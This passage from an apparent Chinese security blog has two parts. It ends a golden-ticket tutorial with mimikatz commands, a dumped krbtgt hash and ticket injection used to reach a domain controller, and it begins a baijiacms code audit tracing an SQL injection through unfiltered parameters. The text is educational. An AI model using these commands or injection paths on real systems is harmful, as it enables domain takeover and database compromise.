src="image-20211201210759566.png"></p><p><code>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:65dc23a67f31503698981f2665f9d858:::</code></p><p><code>65dc23a67f31503698981f2665f9d858</code>即为krbtgt的ntlm</p><h3 id="伪造票据"><a href="#伪造票据" class="headerlink" title="伪造票据"></a>伪造票据</h3><p><code>mimikatz # kerberos::golden /admin:administrator /domain:sun.com /sid:S-1-5-21-3388020223-1982701712-4030140183 /krbtgt:65dc23a67f31503698981f2665f9d858 /ticket:golden.kiribi</code></p><p><img src="image-20211201213154630.png"></p><h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><p>清空本地票据缓存，导入伪造的票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::list   #查看本地保存的票据，观察client namekerberos::purge  #清除本地票据缓存Kerberos::ptt golden.kiribi  #导入伪造的黄金票据kerberos::list   #查看本地保存的票据，观察client name是否变为我们票据中的用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211201213253265.png"></p><p>证明此时票据已经导入，<code>dir \\DC\c$</code> 已经与域控建立连接</p><p><img src="image-20211201213622711.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
            <tag> 权限维持 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>baijiacms-代码审计</title>
      <link href="/2021/11/24/baijiacms-dai-ma-shen-ji/"/>
      <url>/2021/11/24/baijiacms-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="baijiacms-代码审计"><a href="#baijiacms-代码审计" class="headerlink" title="baijiacms-代码审计"></a>baijiacms-代码审计</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>这里使用burp联动xray的方式进行被动型的漏洞扫描，同时也能让我们了解该cms的相关功能，对可能存在的功能点结合代码进行深入分析。</p><p><code>.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output baijiacms.html</code></p><p><img src="image-20211123161704910.png"></p><p>xray一开动就发现有所收获，order参数处存在时间注入与报错注入，cate参数处存在报错注入。</p><p><img src="image-20211123162400163.png"></p><p><img src="image-20211123162523850.png"></p><p><img src="image-20211123162549214.png"></p><h2 id="路由解析"><a href="#路由解析" class="headerlink" title="路由解析"></a>路由解析</h2><p>我们在分析这个SQL注入之前，先对该cms的路由先要有基本的了解，通过路由跟踪到相应文件审计代码。</p><p>我们通过阅览商品的页面来对路由进行理解</p><p><code>http://baijia.test/index.php?mod=mobile&amp;act=detail&amp;do=shop&amp;m=eshop&amp;beid=1&amp;id=1</code></p><p>该url存在6个参数，mod、act、do、m、beid、id</p><p>如果传入了mod参数，$mod = $_REQUEST[‘mod’] ，默认为’mobile’</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$mod</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'entry'</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string single-quoted-string">'mobile'</span><span class="token punctuation">:</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token variable">$mod</span><span class="token operator">=</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mod'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string single-quoted-string">'mobile'</span><span class="token punctuation">:</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mod'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当$mod = ‘mobile’ ，则定义常量SYSTEM_ACT为mobile，否则为index。</p><p>do参数默认为shopindex</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"shopindex"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>act参数如果传入就将值交给$_GET[‘act’]，未传入$_GET[‘act’]值为shopwap.</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'act'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'act'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'act'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'act'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"shopwap"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继而包含<code>includes/baijiacms.php</code>文件</p><p>在文件中，对外部输入的数组值进行了实体化的操作，然后定义了$_GP、$_CMS数组，将$_GET, $_POST, $_GP数组合并给了$_GP</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_GP</span> <span class="token operator">=</span> <span class="token variable">$_CMS</span> <span class="token operator">=</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_GP</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">,</span> <span class="token variable">$_GP</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果$_GP[‘m’]为空，则$modulename = $_GP[‘act’] ，否则$modulename = $_GP[‘m’]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$modulename</span> <span class="token operator">=</span> <span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'act'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token variable">$modulename</span> <span class="token operator">=</span> <span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$modulename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"do or act is null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_CMS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'module'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$modulename</span><span class="token punctuation">;</span><span class="token variable">$_CMS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'beid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'beid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当加载完配置文件则最后会包含<code>/includes/baijiacms/runner.inc.php</code>. 该文件为路由解析文件</p><p>首先会做判断，这里判断为真，这里是对店铺的一个查询，并返回该店铺的相关信息，如这里的店铺号为1，店铺名为默认店铺 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_CMS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'beid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token constant">SYSTEM_ACT</span><span class="token operator">==</span><span class="token string single-quoted-string">'mobile'</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token variable">$modulename</span><span class="token operator">==</span><span class="token string double-quoted-string">"shopwap"</span><span class="token operator">||</span><span class="token variable">$_CMS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isaddons'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token class-name">true</span><span class="token operator">||</span><span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'eshop'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$t_set_shop</span><span class="token operator">=</span><span class="token function">globalSetting</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shop'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$t_set_shop</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$t_set_shop</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'closedetail'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$t_set_shop</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'closeurl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token punctuation">&#123;</span>                  <span class="token function">message</span><span class="token punctuation">(</span><span class="token variable">$t_set_shop</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'closedetail'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$t_set_shop</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'closeurl'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span>         <span class="token punctuation">&#123;</span>               <span class="token function">message</span><span class="token punctuation">(</span><span class="token variable">$t_set_shop</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'closedetail'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，进入到该文件后$modulename为”eshop”，$classname为”eshopAddons”</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token variable">$modulename</span><span class="token operator">.</span><span class="token string double-quoted-string">"Addons"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>包含<code>/system/common/mobile.php</code>，$file = /system/eshop/mobile.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_ACT</span><span class="token operator">==</span><span class="token string single-quoted-string">'mobile'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string single-quoted-string">'/system/common/mobile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">SYSTEM_ROOT</span> <span class="token operator">.</span> <span class="token variable">$modulename</span><span class="token operator">.</span><span class="token string double-quoted-string">"/mobile.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string single-quoted-string">'/system/common/web.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">SYSTEM_ROOT</span> <span class="token operator">.</span> <span class="token variable">$modulename</span><span class="token operator">.</span><span class="token string double-quoted-string">"/web.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>/system/common/mobile.php</code>中会对用户状态进行判断</p><p>如果$_GP[‘m’]不为空，包含<code>/system/common/common.php</code> ，然后直接包含$file文件，如刚才的<code>/system/eshop/mobile.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GP</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token constant">WEB_ROOT</span><span class="token operator">.</span><span class="token string single-quoted-string">'/system/common/common.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">require</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实例化$classname() ，设置其属性。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$classname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token property">module</span> <span class="token operator">=</span> <span class="token variable">$modulename</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token property">inMobile</span> <span class="token operator">=</span> <span class="token constant">SYSTEM_ACT</span><span class="token operator">==</span><span class="token string single-quoted-string">'mobile'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接下来，会对$_GP[‘m’]的值做判断，如果不为eshop则进入到函数体。</p><p>这里又会对$class进行判断，如果当中存在BJexModule类，则进入函数体，然后将doMobile与$_GPC[‘do’]拼接作为$class的方法执行，到此一个基本的路由解析到文件执行方法就基本完成。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$class</span> <span class="token keyword">instanceof</span> <span class="token class-name">BJexModule</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token property">uniacid</span> <span class="token operator">=</span> <span class="token variable">$class</span><span class="token operator">-></span><span class="token property">weid</span> <span class="token operator">=</span> <span class="token variable">$_W</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uniacid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token property">modulename</span> <span class="token operator">=</span> <span class="token variable">$_W</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'module'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token property">__define</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token property">inMobile</span> <span class="token operator">=</span> <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IN_MOBILE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">SYSTEM_ACT</span><span class="token operator">==</span><span class="token string single-quoted-string">'mobile'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IN_MOBILE'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'doMobile'</span> <span class="token operator">.</span> <span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token variable">$method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>上面分析了一种情况的路由，我们根据路由解析则可以通过刚才的url定位到，这里我们分析cate参数的报错注入</p><p>通过路由，会解析到/system/eshop/core/mobile/goods/index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagesize'</span> <span class="token operator">=></span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'page'</span> <span class="token operator">=></span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'isnew'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isnew'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ishot'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ishot'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'isrecommand'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isrecommand'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'isdiscount'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isdiscount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'istime'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'istime'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'issendfree'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'issendfree'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'keywords'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'keywords'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cate'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cate'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'order'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'by'</span> <span class="token operator">=></span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GPC</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'by'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来在goods_getList，没有对$args[‘cate’]做过滤就直接将其值拼接进了$condition</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cate'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$condition</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' AND ( pcate='</span> <span class="token operator">.</span> <span class="token variable">$args</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cate'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' or ccate='</span> <span class="token operator">.</span> <span class="token variable">$args</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cate'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' )'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后将$condition拼接$sql</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$random</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'SELECT id,title,thumb,marketprice,productprice,sales,total,description FROM '</span> <span class="token operator">.</span> <span class="token function">tablename</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'eshop_goods'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' where 1 '</span> <span class="token operator">.</span> <span class="token variable">$condition</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' ORDER BY '</span> <span class="token operator">.</span> <span class="token variable">$order</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$orderby</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' LIMIT '</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token variable">$pagesize</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">','</span> <span class="token operator">.</span> <span class="token variable">$pagesize</span><span class="token punctuation">;</span>   <span class="token variable">$total</span> <span class="token operator">=</span> <span class="token function">pdo_fetchcolumn</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select count(*) from '</span> <span class="token operator">.</span> <span class="token function">tablename</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'eshop_goods'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' where 1 '</span> <span class="token operator">.</span> <span class="token variable">$condition</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'SELECT id,title,thumb,marketprice,productprice,sales,total,description FROM '</span> <span class="token operator">.</span> <span class="token function">tablename</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'eshop_goods'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' where 1 '</span> <span class="token operator">.</span> <span class="token variable">$condition</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' ORDER BY rand() LIMIT '</span> <span class="token operator">.</span> <span class="token variable">$pagesize</span><span class="token punctuation">;</span>   <span class="token variable">$total</span> <span class="token operator">=</span> <span class="token variable">$pagesize</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$list</span> <span class="token operator">=</span> <span class="token function">pdo_fetchall</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$list</span> <span class="token operator">=</span> <span class="token function">set_medias</span><span class="token punctuation">(</span><span class="token variable">$list</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'thumb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'list'</span> <span class="token operator">=></span> <span class="token variable">$list</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'total'</span> <span class="token operator">=></span> <span class="token variable">$total</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后debug函数将执行的SQL语句和错误输出到页面上，造成报错注入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">debug</span><span class="token punctuation">(</span><span class="token variable">$errors</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$errors</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 